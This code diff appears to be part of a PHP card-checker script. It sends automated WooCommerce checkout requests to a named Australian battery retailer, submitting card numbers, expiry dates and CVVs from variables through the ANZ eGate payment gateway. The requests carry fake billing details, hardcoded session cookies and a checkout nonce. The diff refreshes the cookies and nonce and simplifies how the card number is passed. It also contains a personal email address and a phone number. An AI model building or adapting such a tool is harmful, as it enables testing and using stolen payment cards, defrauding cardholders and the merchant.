@@ -226,7 +226,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; wplc_chat_status=5; _icl_current_language=en; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; nc_status=browsing; tcx_customerID=SJ0PrQLuCL; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=ee44954c74859f21239431caa72201bf%7C%7C1593669193%7C%7C1593665593%7C%7Cd4dd71bc5aad05b284bdae3c7f8fed70; wplc_cid=SJXRCIsK0I_1593583318130; woocommerce_items_in_cart=1; woocommerce_cart_hash=b9c0cc9bba61665516d7343ea7a9d697',
+'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; tcx_customerID=SJ0PrQLuCL; wplc_chat_status=5; _icl_current_language=en; nc_status=browsing; wplc_cid=BybIJQUjRU_1593692894012; woocommerce_items_in_cart=1; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=7787a691d6f83ac0fd9c750074ed0092%7C%7C1593865778%7C%7C1593862178%7C%7C2f5341f2a53e696142181ceae281e2b7; woocommerce_cart_hash=3e5ad1f1a5c6fc62ea7d7d474b95980e',
 'origin: https://www.batteryyard.com.au',
 'referer: https://www.batteryyard.com.au/checkout/',
 'user-agent: '.$browser.'',
@@ -234,8 +234,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=local_pickup%3A21&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=e951ff0dd5&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=local_pickup%3A21&payment_method=anz_egate&anz_egate-card-number='.$cc.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=136643446c&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 $result = curl_exec($ch);
